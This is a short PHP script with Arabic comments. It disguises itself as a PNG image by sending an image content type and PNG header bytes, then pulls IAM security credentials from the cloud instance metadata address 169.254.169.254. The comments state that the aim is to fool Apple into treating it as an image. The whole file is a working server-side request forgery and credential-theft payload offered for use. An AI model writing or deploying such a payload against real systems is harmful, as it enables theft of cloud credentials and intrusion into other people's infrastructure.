<?php
header("Content-Type: image/png");
// بنوهم أبل إن دي صورة PNG
echo "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a"; 
// بعدين بنسحب الميتا داتا
echo file_get_contents("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
?>
